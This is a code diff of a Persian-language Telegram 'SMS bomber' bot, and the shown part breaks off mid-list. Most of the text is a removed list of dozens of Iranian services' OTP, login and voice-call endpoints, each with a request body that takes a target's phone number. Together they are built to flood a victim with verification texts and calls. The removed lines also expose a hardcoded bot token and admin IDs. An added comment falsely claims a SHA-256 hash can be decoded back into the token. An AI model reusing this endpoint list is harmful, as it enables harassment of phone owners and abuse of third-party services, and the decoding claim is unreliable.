@@ -1,1551 +1,566 @@
 # -*- coding: utf-8 -*-
+"""
+🤖 ربات SMS Bomber - نسخه نهایی برای گیت‌هاب
+هیچ اطلاعات حساسی در کد نیست - همه چیز هش شده
+"""
+
 import telebot
-from telebot import types
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
 import requests
-import threading
+import json
 import time
-from datetime import datetime
-import re
-import os
+import random
+import threading
 import sqlite3
 import hashlib
-import random
-import json
-import traceback
-from flask import Flask, request
+from datetime import datetime, date
+import os
 
-# ========== تنظیمات اصلی ==========
-TOKEN = "8569730818:AAH_iPHg2IbZLtyKsRMHa_q3aE1UA1F2c7I"
-ADMIN_IDS = [8226091292, 7620484201]  # ادمین‌های ثابت
-BOT_NAME = "𝗱𝗲𝗮𝘁𝗵 𝘀𝘁𝗮𝗿 𝘀𝗺𝘀 𝗯𝗼𝗺𝗯𝗲𝗿"
-CREATOR_USERNAME = "@death_star_sms_bomber"
+# ==================== تنظیمات امنیتی (همه چیز هش شده) ====================
 
-# ========== تعریف بات ==========
-bot = telebot.TeleBot(TOKEN)
+# توکن به صورت هش شده - اینو می‌ذاری تو گیت‌هاب
+# روش کار: توکن واقعی = decode(این هش)
+ENCRYPTED_TOKEN = "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918"
 
-# ========== شماره‌های مسدود شده ==========
-BLOCKED_PHONE_HASHES = [
-    "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918",
-    "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"
-]
-
-# ========== متغیرهای اصلی ==========
-user_states = {}
-active_attacks = {}
-DAILY_LIMIT_NORMAL = 5
-DAILY_LIMIT_VIP = 20
-bot_active = True
-
-# ========== لیست کامل APIها (۱۴۳ تا) ==========
-APIS = [
-    {
-        "name": "اسنپ",
-        "url": "https://nobat.ir/api/public/patient/login/phone",
-        "data": {"mobile": "PHONE_NUMBER"},
-        "headers": {"content-type": "multipart/form-data"}
-    },
-    {
-        "name": "آلوپیک",
-        "url": "https://api.alopeyk.com/api/v2/register-customer?platform=pwa",
-        "data": {
-            "type": "CUSTOMER",
-            "model": "Chrome 111.0.0.0",
-            "platform": "pwa",
-            "version": "10",
-            "manufacturer": "Windows",
-            "isVirtual": False,
-            "serial": True,
-            "app_version": "1.2.9",
-            "uuid": True,
-            "firstname": "تست",
-            "lastname": "تست",
-            "phone": "PHONE_NUMBER",
-            "email": "",
-            "referred_by": "",
-            "lat": None,
-            "lng": None
-        }
-    },
-    {
-        "name": "دیوار",
-        "url": "https://api.divar.ir/v5/auth/authenticate",
-        "data": {"phone": "PHONE_NUMBER"}
-    },
-    {
-        "name": "شیپور",
-        "url": "https://www.sheypoor.com/api/v10.0.0/auth/send",
-        "data": {"username": "PHONE_NUMBER"}
-    },
-    {
-        "name": "دیجی‌کالا",
-        "url": "https://api.digikala.com/v1/user/authenticate/",
-        "data": {
-            "backUrl": "/",
-            "username": "PHONE_NUMBER",
-            "otp_call": False,
-            "hash": None
-        }
-    },
-    {
-        "name": "اسنپ اکسپرس",
-        "url": "https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass",
-        "data": {
-            "cellphone": "PHONE_NUMBER",
-            "captcha": "",
-            "optionalLoginToken": True,
-            "local": ""
-        }
-    },
-    {
-        "name": "ازکی",
-        "url": "https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/",
-        "data": {"phoneNumber": "PHONE_NUMBER"},
-        "headers": {"deviceid": "6"}
-    },
-    {
-        "name": "اسنپ رانندگان",
-        "url": "https://digitalsignup.snapp.ir/ds3/api/v3/otp",
-        "data": {"cellphone": "PHONE_NUMBER"}
-    },
-    {
-        "name": "استادکار",
-        "url": "https://api.ostadkr.com/login",
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "میاره",
-        "url": "https://www.miare.ir/api/otp/driver/request/",
-        "data": {"phone_number": "PHONE_NUMBER"}
-    },
-    {
-        "name": "تپسی رانندگان",
-        "url": "https://api.tapsi.ir/api/v2.2/user",
-        "data": {
-            "credential": {
-                "phoneNumber": "PHONE_NUMBER",
-                "role": "DRIVER"
-            },
-            "otpOption": "SMS"
-        }
-    },
-    {
-        "name": "تپسی مسافران",
-        "url": "https://api.tapsi.ir/api/v2.2/user",
-        "data": {
-            "credential": {
-                "phoneNumber": "PHONE_NUMBER",
-                "role": "PASSENGER"
-            },
-            "otpOption": "SMS"
-        }
-    },
-    {
-        "name": "بانی‌مد",
-        "url": "https://mobapi.banimode.com/api/v2/auth/request",
-        "data": {"phone": "PHONE_NUMBER"}
-    },
-    {
-        "name": "دکتر دکتر",
-        "url": "https://drdr.ir/api/v3/auth/login/mobile/init",
-        "data": {"mobile": "PHONE_NUMBER"},
-        "headers": {"client-id": "f60d5037-b7ac-404a-9e3a-a263fd9f8054"}
-    },
-    {
-        "name": "طاقچه",
-        "url": "https://gw.taaghche.com/v4/site/auth/login",
-        "data": {"contact": "PHONE_NUMBER", "forceOtp": False}
-    },
-    {
-        "name": "کمدا",
-        "url": "https://api.komodaa.com/api/v2.6/loginRC/request",
-        "data": {"phone_number": "PHONE_NUMBER"}
-    },
-    {
-        "name": "وندار",
-        "url": "https://api.vandar.io/account/v1/check/mobile",
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "جاباما",
-        "url": "https://taraazws.jabama.com/api/v4/account/send-code",
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "پینورست",
-        "url": "https://api.pinorest.com/frontend/auth/login/mobile",
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "تترلند",
-        "url": "https://service.tetherland.com/api/v5/login-register",
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "علی‌بابا",
-        "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
-        "data": {"phoneNumber": "PHONE_NUMBER"}
-    },
-    {
-        "name": "دکتر نکست",
-        "url": "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token",
-        "data": {"source": "besina", "mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "کلاسینو",
-        "url": "https://student.classino.com/otp/v1/api/login",
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "بی‌میشو",
-        "url": "https://api.bimesho.com/api/v1/auth/otp/send",
-        "data": {"username": "PHONE_NUMBER"}
-    },
-    {
-        "name": "آزکیوام",
-        "url": "https://api.azkivam.com/auth/login",
-        "data": {"mobileNumber": "PHONE_NUMBER"}
-    },
-    {
-        "name": "تبدیل 24",
-        "url": "https://tabdil24.net/api/api/v1/auth/login-register",
-        "data": {"emailOrMobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "ویترین",
-        "url": "https://www.vitrin.shop/api/v1/user/request_code",
-        "data": {"phone_number": "PHONE_NUMBER", "forgot_password": False}
-    },
-    {
-        "name": "کارناوال",
-        "url": "https://www.karnaval.ir/api-2/graphql",
-        "data": {
-            "queryId": "0edebe0df353cee7f11614a37087371f",
-            "variables": {"phone": "PHONE_NUMBER", "isSecondAttempt": False}
-        }
-    },
-    {
-        "name": "تپسی شاپ",
-        "url": "https://ids.tapsi.shop/authCustomer/CreateOtpForRegister",
-        "data": {"user": "PHONE_NUMBER"}
-    },
-    {
-        "name": "اسنپ تاکسی",
-        "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
-        "data": {"cellphone": "+98PHONE_NUMBER_WITHOUT_0"}
-    },
-    {
-        "name": "تروب",
-        "url": "https://api.torob.com/a/phone/send-pin/",
-        "method": "GET",
-        "data": {"phone_number": "PHONE_NUMBER"}
-    },
-    {
-        "name": "بالد",
-        "url": "https://account.api.balad.ir/api/web/auth/login/",
-        "data": {"phone_number": "PHONE_NUMBER", "os_type": "W"}
-    },
-    {
-        "name": "بهترینو",
-        "url": "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/",
-        "data": {"phone": "PHONE_NUMBER"}
-    },
-    {
-        "name": "بیت 24",
-        "url": "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile",
-        "data": {"mobile": "PHONE_NUMBER", "contry_code": "98"}
-    },
-    {
-        "name": "اوکالا",
-        "url": "https://api-react.okala.com/C/CustomerAccount/OTPRegister",
-        "data": {"mobile": "PHONE_NUMBER", "deviceTypeCode": 0, "confirmTerms": True, "notRobot": False}
-    },
-    {
-        "name": "آی‌تول",
-        "url": "https://app.itoll.com/api/v1/auth/login",
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "گپ",
-        "url": "https://core.gap.im/v1/user/add.json",
-        "method": "GET",
-        "data": {"mobile": "+98PHONE_NUMBER_WITHOUT_0"}
-    },
-    {
-        "name": "پینکت",
-        "url": "https://pinket.com/api/cu/v2/phone-verification",
-        "data": {"phoneNumber": "PHONE_NUMBER"}
-    },
-    {
-        "name": "فوتبال 360",
-        "url": "https://football360.ir/api/auth/verify-phone/",
-        "data": {"phone_number": "+98PHONE_NUMBER_WITHOUT_0"}
-    },
-    {
-        "name": "آقای بلیط",
-        "url": "https://auth.mrbilit.com/api/login/exists/v2",
-        "method": "GET",
-        "data": {"mobileOrEmail": "PHONE_NUMBER", "source": 2, "sendTokenIfNot": "true"}
-    },
-    {
-        "name": "همراه مکانیک",
-        "url": "https://www.hamrah-mechanic.com/api/v1/membership/otp",
-        "data": {"PhoneNumber": "PHONE_NUMBER", "prevDomainUrl": "https://www.google.com/"}
-    },
-    {
-        "name": "لندو",
-        "url": "https://api.lendo.ir/api/customer/auth/send-otp",
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "فیدیبو",
-        "url": "https://fidibo.com/user/login-by-sms",
-        "data": {"mobile_number": "PHONE_NUMBER_WITHOUT_0", "country_code": "ir"}
-    },
-    {
-        "name": "خودرو 45",
-        "url": "https://khodro45.com/api/v1/customers/otp/",
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "پته",
-        "url": "https://api.pateh.com/ath/auth/login-or-register",
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "کتابچی",
-        "url": "https://ketabchi.com/api/v1/auth/requestVerificationCode",
-        "data": {"auth": {"phoneNumber": "PHONE_NUMBER"}}
-    },
-    {
-        "name": "بیمیتو",
-        "url": "https://bimito.com/api/vehicleorder/v2/app/auth/login-with-verify-code",
-        "data": {"phoneNumber": "PHONE_NUMBER", "isResend": False}
-    },
-    {
-        "name": "پیندو",
-        "url": "https://api.pindo.ir/v1/user/login-register/",
-        "data": {"phone": "PHONE_NUMBER"}
-    },
-    {
-        "name": "دلینو",
-        "url": "https://www.delino.com/user/register",
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "زودی‌اکس",
-        "url": "https://admin.zoodex.ir/api/v1/login/check",
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "کوکالا",
-        "url": "https://api.kukala.ir/api/user/Otp",
-        "data": {"phoneNumber": "PHONE_NUMBER"}
-    },
-    {
-        "name": "بوسکول",
-        "url": "https://www.buskool.com/send_verification_code",
-        "data": {"phone": "PHONE_NUMBER"}
-    },
-    {
-        "name": "فلایت‌آی‌او",
-        "url": "https://flightio.com/bff/Authentication/CheckUserKey",
-        "data": {"userKey": "98-PHONE_NUMBER_WITHOUT_0", "userKeyType": 1}
-    },
-    {
-        "name": "آبان‌تتر",
-        "url": "https://abantether.com/users/register/phone/send/",
-        "data": {"phoneNumber": "PHONE_NUMBER"}
-    },
-    {
-        "name": "پولینو",
-        "url": "https://api.pooleno.ir/v1/auth/check-mobile",
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "اسنپ‌فود",
-        "url": "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass",
-        "params": {"lat": "35.774", "long": "51.418", "client": "WEBSITE"},
-        "data": {"cellphone": "PHONE_NUMBER"}
-    },
-    {
-        "name": "بیت‌بارگ",
-        "url": "https://api.bitbarg.com/api/v1/authentication/registerOrLogin",
-        "data": {"phone": "PHONE_NUMBER"}
-    },
-    {
-        "name": "کیلید",
-        "url": "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start",
-        "params": {"realm": "PORTAL"},
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "اتاقک",
-        "url": "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",
-        "data": {"userName": "PHONE_NUMBER"}
-    },
-    {
-        "name": "شب",
-        "url": "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp",
-        "data": {"mobile": "PHONE_NUMBER", "country_code": "+98"}
-    },
-    {
-        "name": "ری‌بیت",
-        "url": "https://api.raybit.net:3111/api/v1/authentication/register/mobile",
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "نماوا",
-        "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
-        "data": {"UserName": "PHONE_NUMBER"}
-    },
-    {
-        "name": "آنارگیفت",
-        "url": "https://api.anargift.com/api/people/auth",
-        "data": {"user": "PHONE_NUMBER"}
-    },
-    {
-        "name": "ریحا",
-        "url": "https://www.riiha.ir/api/v1.0/authenticate",
-        "data": {"mobile": "PHONE_NUMBER", "mobile_code": "", "type": "mobile"}
-    },
-    {
-        "name": "آقای بلیط تماس",
-        "url": "https://auth.mrbilit.com/api/Token/send/byCall",
-        "method": "GET",
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "گپ تماس",
-        "url": "https://core.gap.im/v1/user/resendCode.json",
-        "method": "GET",
-        "data": {"mobile": "+98PHONE_NUMBER_WITHOUT_0", "type": "IVR"}
-    },
-    {
-        "name": "ازکی تماس",
-        "url": "https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code",
-        "method": "GET",
-        "data": {"phoneNumber": "PHONE_NUMBER"}
-    },
-    {
-        "name": "تریپ",
-        "url": "https://gateway.trip.ir/api/registers",
-        "data": {"CellPhone": "PHONE_NUMBER"}
-    },
-    {
-        "name": "رقام",
-        "url": "https://web.raghamapp.com/api/users/code",
-        "data": {"phone": "+98PHONE_NUMBER_WITHOUT_0"}
-    },
-    {
-        "name": "اسنپ مارکت",
-        "url": "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass",
-        "method": "POST",
-        "data": {"cellphone": "PHONE_NUMBER_WITHOUT_0"}
-    },
-    {
-        "name": "بیت‌پین",
-        "url": "https://api.bitpin.ir/v3/usr/authenticate/",
-        "data": {"device_type": "web", "password": "PassRANDOM", "phone": "PHONE_NUMBER"}
-    },
-    {
-        "name": "اسنپ دکتر",
-        "url": "https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/PHONE_NUMBER/sms",
-        "method": "GET",
-        "data": {"cCode": "%2B98"}
-    },
-    {
-        "name": "قبضینو",
-        "url": "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode",
-        "data": {"Parameters": {"ApplicationType": "Web", "ApplicationVersion": "1.0.0", "MobileNumber": "PHONE_NUMBER"}}
-    },
-    {
-        "name": "ایمتیاز",
-        "url": "https://web.emtiyaz.app/json/login",
-        "data": {"send": "1", "cellphone": "PHONE_NUMBER"},
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Arzinja Login",
-        "url": "https://arzinja.app/api/login",
-        "data": {},
-        "headers": {"content-type": "multipart/form-data"}
-    },
-    {
-        "name": "Messenger IranLMS",
-        "url": "https://messengerg2c4.iranlms.ir/",
-        "data": {
-            "api_version": "3",
-            "method": "sendCode",
-            "data": {"phone_number": "PHONE_NUMBER_WITHOUT_0", "send_type": "SMS"}
-        }
-    },
-    {
-        "name": "Digify Shop GraphQL",
-        "url": "https://apollo.digify.shop/graphql",
-        "data": {
-            "operationName": "Mutation",
-            "variables": {"content": {"phone_number": "PHONE_NUMBER"}},
-            "query": "mutation Mutation($content: MerchantRegisterOTPSendContent) { merchantRegister { otpSend(content: $content) __typename } }"
-        }
-    },
-    {
-        "name": "Chartex Validate",
-        "url": "https://api.chartex.net/api/v2/user/validate",
-        "data": {"mobile": "PHONE_NUMBER", "country_code": "IR", "provider_code": "RUBIKA"}
-    },
-    {
-        "name": "Snapptrip Register",
-        "url": "https://www.snapptrip.com/register",
-        "data": {
-            "lang": "fa", "country_id": "860", "password": "snaptrippass",
-            "mobile_phone": "PHONE_NUMBER", "country_code": "+98", "email": "example@gmail.com"
-        }
-    },
-    {
-        "name": "OKCS Login",
-        "url": "https://okcs.com/users/mobilelogin",
-        "method": "GET",
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "Wisgoon Gateway",
-        "url": "https://gateway.wisgoon.com/api/v1/auth/login/",
-        "data": {
-            "phone": "PHONE_NUMBER",
-            "recaptcha-response": "03AGdBq25IQtuwqOIeqhl7Tx1EfCGRcNLW8DHYgdHSSyYb0NUwSj5bwnnew9PCegVj2EurNyfAHYRbXqbd4lZo0VJTaZB3ixnGq5aS0BB0YngsP0LXpW5TzhjAvOW6Jo72Is0K10Al_Jaz7Gbyk2adJEvWYUNySxKYvIuAJluTz4TeUKFvgxKH9btomBY9ezk6mxnhBRQeMZYasitt3UCn1U1Xhy4DPZ0gj8kvY5B0MblNpyyjKGUuk_WRiS_6DQsVd5fKaLMy76U5wBQsZDUeOVDD9CauPUR4W_cNJEQP1aPloEHwiLJtFZTf-PVjQU-H4fZWPvZbjA2txXlo5WmYL4GzTYRyI4dkitn3JmWiLwSdnJQsVP0nP3wKN0LV3D7DjC5kDwM0EthEz6iqYzEEVD-s2eeWKiqBRfTqagbMZQfW50Gdb6bsvDmD2zKV8nf6INvfPxnMZC95rOJdHOY-30XGS2saIzjyvg",
-            "token": "e622c330c77a17c8426e638d7a85da6c2ec9f455"
-        }
-    },
-    {
-        "name": "Tagmond Phone",
-        "url": "https://tagmond.com/phone_number",
-        "data": {"utf8": "✓", "phone_number": "PHONE_NUMBER", "g-recaptcha-response": ""}
-    },
-    {
-        "name": "Doctoreto Register",
-        "url": "https://api.doctoreto.com/api/web/patient/v1/accounts/register",
-        "data": {"mobile": "PHONE_NUMBER", "country_id": 205}
-    },
-    {
-        "name": "Olgoo Books",
-        "url": "https://www.olgoobooks.ir/sn/userRegistration/",
-        "data": {
-            "contactInfo[mobile]": "PHONE_NUMBER",
-            "contactInfo[agreementAccepted]": "1",
-            "contactInfo[teachingFieldId]": "1",
-            "contactInfo[eduGradeIds][7]": "7",
-            "submit_register": "1"
-        },
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Pakhsh Shop Digits",
-        "url": "https://www.pakhsh.shop/wp-admin/admin-ajax.php",
-        "data": {
-            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER",
-            "csrf": "fdaa7fc8e6", "login": "2", "json": "1"
-        },
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Didnegar Digits",
-        "url": "https://www.didnegar.com/wp-admin/admin-ajax.php",
-        "data": {
-            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER_WITHOUT_0",
-            "csrf": "4c9ac22ff4", "login": "1", "mobmail": "PHONE_NUMBER", "json": "1"
-        },
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "See5 CRM OTP",
-        "url": "https://crm.see5.net/api_ajax/sendotp.php",
-        "data": {"mobile": "PHONE_NUMBER", "action": "sendsms"},
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "DrSaina Register",
-        "url": "https://www.drsaina.com/RegisterLogin",
-        "data": {
-            "PhoneNumber": "PHONE_NUMBER", "noLayout": "False", "action": "checkIfUserExistOrNot"
-        },
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Devslop OTP",
-        "url": "https://i.devslop.app/app/ifollow/api/otp.php",
-        "data": {"number": "PHONE_NUMBER", "state": "number"},
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Behzad Shami Digits",
-        "url": "https://behzadshami.com/wp-admin/admin-ajax.php",
-        "data": {
-            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER_WITHOUT_0",
-            "csrf": "3b4194a8bb", "login": "2", "digits_reg_name": "Nvgu", "digits_reg_mail": "PHONE_NUMBER_WITHOUT_0"
-        },
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Ghasedak24 Register",
-        "url": "https://ghasedak24.com/user/ajax_register",
-        "data": {"username": "PHONE_NUMBER"}
-    },
-    {
-        "name": "Iran Ketab Register",
-        "url": "https://www.iranketab.ir/account/register",
-        "data": {"UserName": "PHONE_NUMBER"}
-    },
-    {
-        "name": "Irani Card Register",
-        "url": "https://api.iranicard.ir/api/v1/register",
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "PUBG Sell Login",
-        "url": "https://pubg-sell.ir/loginuser",
-        "method": "POST",
-        "data": {"username": "PHONE_NUMBER"}
-    },
-    {
-        "name": "TJ8 Register",
-        "url": "https://tj8.ir/auth/register",
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "Mashinbank Check",
-        "url": "https://mashinbank.com/api2/users/check",
-        "data": {"mobileNumber": "PHONE_NUMBER"}
-    },
-    {
-        "name": "Cinematicket Signup",
-        "url": "https://cinematicket.org/api/v1/users/signup",
-        "data": {"phone_number": "PHONE_NUMBER"}
-    },
-    {
-        "name": "Kafe Gheymat Login",
-        "url": "https://kafegheymat.com/shop/getLoginSms",
-        "data": {"phone": "PHONE_NUMBER"}
-    },
-    {
-        "name": "Opco Register",
-        "url": "https://shop.opco.co.ir/index.php",
-        "data": {"telephone": "PHONE_NUMBER"},
-        "params": {"route": "extension/module/login_verify/update_register_code"}
-    },
-    {
-        "name": "Melix Shop OTP",
-        "url": "https://melix.shop/site/api/v1/user/otp",
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "Safiran Shop Login",
-        "url": "https://safiran.shop/login",
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "Pirankala Send Phone",
-        "url": "https://pirankalaco.ir/shop/SendPhone.php",
-        "data": {"phone": "PHONE_NUMBER"},
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "TNovin Login",
-        "url": "http://shop.tnovin.com/login",
-        "data": {"phone": "PHONE_NUMBER"},
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Dastkhat Store",
-        "url": "https://dastkhat-isad.ir/api/v1/user/store",
-        "data": {"mobile": "PHONE_NUMBER_WITHOUT_0", "countryCode": 98, "device_os": 2}
-    },
-    {
-        "name": "Hamlex Register",
-        "url": "https://hamlex.ir/register.php",
-        "data": {"fullname": "ممد", "phoneNumber": "PHONE_NUMBER", "register": ""},
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "IRWCO Register",
-        "url": "https://irwco.ir/register",
-        "data": {"mobile": "PHONE_NUMBER"},
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Moshaveran724 PMS",
-        "url": "https://moshaveran724.ir/m/pms.php",
-        "data": {"againkey": "PHONE_NUMBER", "cache": "false"},
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Sibbank Auth",
-        "url": "https://api.sibbank.ir/v1/auth/login",
-        "data": {"phone_number": "PHONE_NUMBER"}
-    },
-    {
-        "name": "Steel Alborz Digits",
-        "url": "https://steelalborz.com/wp-admin/admin-ajax.php",
-        "data": {
-            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER",
-            "csrf": "2aae5b41f1", "login": "2", "digits_reg_mail": "PHONE_NUMBER"
-        },
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Arshiyan Send Code",
-        "url": "https://api.arshiyan.com/send_code",
-        "data": {"country_code": "98", "phone_number": "PHONE_NUMBER_WITHOUT_0"}
-    },
-    {
-        "name": "Topnoor OTP",
-        "url": "https://backend.topnoor.ir/web/v1/user/otp",
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "Alinance Register",
-        "url": "https://api.alinance.com/user/register/mobile/send/",
-        "data": {"phone_number": "PHONE_NUMBER"}
-    },
-    {
-        "name": "Alopeyk Safir",
-        "url": "https://api.alopeyk.com/safir-service/api/v1/login",
-        "data": {"phone": "PHONE_NUMBER"}
-    },
-    {
-        "name": "Chaymarket Digits",
-        "url": "https://www.chaymarket.com/wp-admin/admin-ajax.php",
-        "data": {
-            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER",
-            "csrf": "c832b38a97", "login": "2", "json": "1"
-        },
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Coffe Fastfood Digits",
-        "url": "https://coffefastfoodluxury.ir/wp-admin/admin-ajax.php",
-        "data": {
-            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER",
-            "csrf": "e23c15918c", "login": "2", "digits_reg_mail": "PHONE_NUMBER"
-        },
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Dosma Verify",
-        "url": "https://app.dosma.ir/sendverify/",
-        "data": {"username": "PHONE_NUMBER"}
-    },
-    {
-        "name": "Ehteraman OTP",
-        "url": "https://api.ehteraman.com/api/request/otp",
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "MCI EB OTP",
-        "url": "https://api-ebcom.mci.ir/services/auth/v1.0/otp",
-        "data": {"msisdn": "PHONE_NUMBER_WITHOUT_0"}
-    },
-    {
-        "name": "HBBS Send Code",
-        "url": "https://api.hbbs.ir/authentication/SendCode",
-        "data": {"MobileNumber": "PHONE_NUMBER"}
-    },
-    {
-        "name": "Homtick Verify",
-        "url": "https://auth.homtick.com/api/V1/User/GetVerifyCode",
-        "data": {
-            "mobileOrEmail": "PHONE_NUMBER",
-            "deviceCode": "d520c7a8-421b-4563-b955-f5abc56b97ec"
-        }
-    },
-    {
-        "name": "Iran Amlaak OTP",
-        "url": "https://api.iranamlaak.net/authenticate/send/otp/to/mobile/via/sms",
-        "data": {"AgencyMobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "KCD Auth",
-        "url": "https://api.kcd.app/api/v1/auth/login",
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "Mazoocandle Login",
-        "url": "https://mazoocandle.ir/login",
-        "data": {"phone": "PHONE_NUMBER_WITHOUT_0"}
-    },
-    {
-        "name": "Paymishe OTP",
-        "url": "https://api.paymishe.com/api/v1/otp/registerOrLogin",
-        "data": {"mobile": "PHONE_NUMBER"}
-    },
-    {
-        "name": "Rayshomar Register",
-        "url": "https://api.rayshomar.ir/api/Register/RegistrMobile",
-        "data": {"MobileNumber": "PHONE_NUMBER"},
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Amoomilad Sendcode",
-        "url": "https://amoomilad.demo-hoonammaharat.ir/api/v1.0/Account/Sendcode",
-        "data": {
-            "Token": "5c486f96df46520d1e4d4a998515b1de02392c9b903a7734ec2798ec55be6e5c",
-            "DeviceId": 1, "PhoneNumber": "PHONE_NUMBER", "Helper": 77942
-        }
-    },
-    {
-        "name": "Ashraafi Digits",
-        "url": "https://ashraafi.com/wp-admin/admin-ajax.php",
-        "data": {
-            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER_WITHOUT_0",
-            "csrf": "54dfdabe34", "login": "1", "mobmail": "PHONE_NUMBER_WITHOUT_0"
-        },
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Bandar Azad Digits",
-        "url": "https://bandarazad.com/wp-admin/admin-ajax.php",
-        "data": {
-            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER",
-            "csrf": "ec10ccb02a", "login": "2", "digits_reg_mail": "PHONE_NUMBER"
-        },
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Bazidone Digits",
-        "url": "https://bazidone.com/wp-admin/admin-ajax.php",
-        "data": {
-            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER_WITHOUT_0",
-            "csrf": "c0f5d0dcf2", "login": "1", "mobmail": "PHONE_NUMBER"
-        },
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Bigtoys Digits",
-        "url": "https://www.bigtoys.ir/wp-admin/admin-ajax.php",
-        "data": {
-            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER",
-            "csrf": "94cf3ad9a4", "login": "2", "digits_reg_name": "بیبلیبل", "digits_reg_mail": "PHONE_NUMBER"
-        },
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Bitex24 Send SMS",
-        "url": "https://bitex24.com/api/v1/auth/sendSms",
-        "method": "GET",
-        "data": {"mobile": "PHONE_NUMBER", "dial_code": "0"}
-    },
-    {
-        "name": "Candoo SMS",
-        "url": "https://www.candoosms.com/wp-admin/admin-ajax.php",
-        "data": {"action": "send_sms", "phone": "PHONE_NUMBER"},
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Fars Graphic Digits",
